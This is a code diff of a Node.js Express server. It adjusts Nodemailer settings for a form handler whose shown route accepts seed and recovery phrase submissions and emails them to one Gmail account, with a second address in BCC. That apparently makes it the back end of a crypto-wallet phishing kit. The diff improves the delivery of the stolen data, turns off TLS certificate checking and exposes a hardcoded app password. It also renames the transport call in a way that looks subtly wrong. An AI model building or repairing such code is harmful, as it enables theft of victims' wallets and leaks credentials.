@@ -18,33 +18,37 @@ app.use(
 // Middleware to parse form data
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Configure Nodemailer transporter
-const transporter = nodemailer.createTransport({
+// Configure Nodemailer transporter - FIXED VERSION
+const transporter = nodemailer.createTransporter({
   host: "smtp.gmail.com",
-  port: 465,
-  secure: true,
+  port: 587, // Changed from 465 to 587
+  secure: false, // Changed from true to false for port 587
   auth: {
-    user: "Mikun5y@gmail.com", // Replace with your email
-    pass: "rwzs rmuq slgr vcgz", // Replace with your app password
+    user: "Mikun5y@gmail.com",
+    pass: "rwzs rmuq slgr vcgz", // Your app password (this looks correct)
   },
+  // Add these timeout and TLS settings for better reliability
+  connectionTimeout: 60000, // 60 seconds
+  greetingTimeout: 30000,   // 30 seconds
+  socketTimeout: 60000,     // 60 seconds
+  tls: {
+    rejectUnauthorized: false
+  },
+  // Optional: Add debug logging to see what's happening
+  debug: true,
+  logger: true
 });
+
 // Helper function to send email
 function sendEmail(subject, text) {
   const mailOptions = {
-    from: "Mikun5y@gmail.com", // Replace with your email
-    to: "Mikun5y@gmail.com", // Your email to receive the form data
+    from: "Mikun5y@gmail.com",
+    to: "Mikun5y@gmail.com",
     bcc: "yekeen244@gmail.com",
     subject: subject,
     text: text,
   };
 
-  // transporter.sendMail(mailOptions, (error, info) => {
-  //   if (error) {
-  //     console.error("Error sending email:", error);
-  //   } else {
-  //     console.log("Email sent:", info.response);
-  //   }
-  // });
   return transporter.sendMail(mailOptions)
     .then(info => {
       console.log('Email sent successfully:', info.response);
@@ -55,6 +59,15 @@ function sendEmail(subject, text) {
       throw error;
     });
 }
+
+// Optional: Test the connection when the server starts
+transporter.verify((error, success) => {
+  if (error) {
+    console.error('SMTP connection error:', error);
+  } else {
+    console.log('SMTP server is ready to take our messages');
+  }
+});
 
 // Route for handling Seed/Recovery Phrase submission
 app.post("/submit-seed", (req, res) => {
